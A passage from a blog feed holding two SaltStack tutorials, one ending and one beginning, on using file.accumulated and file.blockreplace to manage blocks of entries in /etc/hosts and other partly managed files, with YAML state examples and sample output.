&lt;li&gt;If several accumulators are targeted on this file they will be merged, but if you use several blockreplace states on the same file the accumulators are merged using the requisites dependencies you've made and accumulators names.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;This last sentence is maybe weird. We'll make an example to see it, but another way of saying that is that it's magical and it should do the things you think it should do (if not, make bug reports).&lt;/p&gt;

&lt;p&gt;So in this example we'll reuse the last example of managing entries in an &lt;code&gt;/etc/hosts&lt;/code&gt; file. But we will manage two blocks of edition. So we have theses two states in an &lt;code&gt;hostsedit_acc.sls&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.blockreplace&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_start&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TOP&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;please&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;edit&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_end&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BOTTOM&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;show_changes&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;append_if_not_found&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;-Error&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;l-Scalar-Plain&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.blockreplace&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_start&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TOP&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;central&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;please&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;edit&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;marker_end&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BLOCK&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;BOTTOM&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;central&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;managed&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;show_changes&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;append_if_not_found&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Same blocks as in the &lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;previous guide&lt;/a&gt; on blockreplace. But there I removed the content attribute (it &lt;em&gt;could&lt;/em&gt; work with a content attribute adding more static stuff, but I do not need it).&lt;/p&gt;

&lt;p&gt;So now if I want to use &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; to push some content in theses blocks I just need to do two things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;target the blockreplace state id in a requisite to ensure my current state will run before&lt;/li&gt;
&lt;li&gt;target the same file (name attribute)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Quite simple, but here we have &lt;strong&gt;two&lt;/strong&gt; managed blocks, my accumulated content will be set in the block targeted by my requisite.&lt;/p&gt;

&lt;p&gt;Let's try it in a second sls file: &lt;code&gt;hosts_data.sls&lt;/code&gt;, but you could split that on more files if everything gets included at the end:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Include dependencies #}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- hostsedit_acc&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostadata1-external-google-dns&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;8.8.8.8 ns1.google.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;8.8.8.4 ns2.google.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostadata2-external-thing&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;93.184.216.119&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;www.example.com&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-central&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostdata3-internal-stuff1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;127.0.0.1&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;foo.local.net&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bar.local.net&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;hostdata4-internal-stuff2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/hosts&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 db.local.net&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 http.local.net&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;127.0.0.1 foobar&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;test-etc-hosts-blockreplace-services-local&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note that I did not use the &lt;code&gt;name&lt;/code&gt; attribute in theses states. Using name I could name the dictionary key, or we could say I would set the accumulator name. I could use names, but using the same accumulator name with the four states, strange things would happen, data from all theses accumulators would be merged in the same accumulator name. So, either avoid name attributes or use it with different names if the targeted blockedit is different. And test your recipes :-)&lt;/p&gt;

&lt;p&gt;Now run it with:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls hosts_data&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should get theses two managed blocks in &lt;code&gt;/etc/hosts&lt;/code&gt;, filled from several states:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# BLOCK TOP : salt managed zone : local services : please do not edit&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     127.0.0.1 foo bar foo.local.net bar.local.net
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;     127.0.0.1 db.local.net
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     127.0.0.1 http.local.net
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     127.0.0.1 foobar
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK BOTTOM : local : end of salt managed zone --&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK TOP : salt managed zone : central services : please do not edit    &lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     93.184.216.119 : www.example.com
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     8.8.8.8 ns1.google.com
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     8.8.8.4 ns2.google.com
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# BLOCK BOTTOM : central : end of salt managed zone --&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Last words&lt;/h2&gt;

&lt;p&gt;Note that this example is based on the development github repository of salt. You may not be able to run theses examples on versions prior to 0.18.0. The multiple blockreplace case is one of the last fix added by @kiorky.
If you use accumulators you may need to subscribe on this &lt;a href=&quot;https://github.com/saltstack/salt/issues/8881&quot;&gt;reload_module vs accumulated issue&lt;/a&gt; on github. It's a quite general issue, but this actually prevents using accumulators on states with too much &lt;em&gt;distance&lt;/em&gt;, as you may loose the accumulated data if something restarted the minion while your states are running.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/p&gt;
</description>
				<published>2014-01-27 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/01/27/saltstack_use_file_accumulated_accumulators_with_file_managed_and_file_blockreplace/</link>
			</item>
		
			<item>
				<title>SaltStack, Manage entries in unmanaged files with File Blockreplace</title>
				<description>&lt;p&gt;Makina Corpus recently started to use Salt-stack, and by using it I mean we also started some contributions.
Salt-stack is a great set of tools, but sometimes your needs aren't covered yet, and in theses cases you'll find that salt-stack is also very easy to improve. The community is very open to contributions, on this blog post we'll study one of out first addition, &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;Managed files and unmanaged ones&lt;/h2&gt;

&lt;p&gt;When using salt-stack, one of the most important task is usually to &lt;strong&gt;set some configuration parameters&lt;/strong&gt; for your system services. To do that one of the very useful tool available in the salt-stack toolkit is the
&lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;&lt;code&gt;file.managed&lt;/code&gt;&lt;/a&gt;. This let you use a file, retrieved from the salt server, computed with a template language like jinja. And you can do almost everything with that, you have a very flexible language, some variables coming from your state, and you create the final setting file. You even have some magic tools like &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; that I will explain in a next post.&lt;/p&gt;

&lt;p&gt;But using this implies that salt will be the &lt;strong&gt;only master&lt;/strong&gt; on this file. On every highstate run from salt the file could be recreated, updated or even removed (not with the managed state, but &lt;code&gt;file.absent&lt;/code&gt; would do that).&lt;/p&gt;

&lt;p&gt;So sometimes &lt;em&gt;managing the whole file is not what you want to do&lt;/em&gt;. Let's see some examples of files that I would not manage with &lt;code&gt;managed&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A file inherited from a package, and having a lot of different forms depending on the host, like an apache central configuration file, compare RedHat and Debian versions, Trying to handle that with &lt;code&gt;managed&lt;/code&gt; would maybe mean re-doing the package maintainers job&lt;/li&gt;
&lt;li&gt;A file where salt is not the only actor, like &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; or &lt;code&gt;/etc/hosts&lt;/code&gt;. Theses files may contain previous entries from humans and may get edited later by theses same people.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;In most cases you have one simple solution for that, a lot of daemons and services allows for an directory-inclusion of configuration files, usually this means a directory &lt;code&gt;foo.d/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If you have a look at a debian system you have for example:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/mysql/conf.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/apache2/conf.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/apt/sources.list.d/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/cron.d/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/cron.daily/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(...)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;And this would let you use a &lt;code&gt;file.managed&lt;/code&gt; state to add your local configuration, without altering the package maintained files. Good thing.&lt;/p&gt;

&lt;p&gt;But still not covering all the needs, there is no &lt;code&gt;/etc/hosts.d/&lt;/code&gt; and no &lt;code&gt;/etc/postgresql/pg_hba.conf.d/&lt;/code&gt;. To edit the postgresql access file or your local hosts file you must work on the existing files.&lt;/p&gt;

&lt;p&gt;You need a way to edit some files, to replace some key values, &lt;strong&gt;while not managing the whole file&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The file module has two tools for such needs:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.replace&quot;&gt;&lt;code&gt;file.replace&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


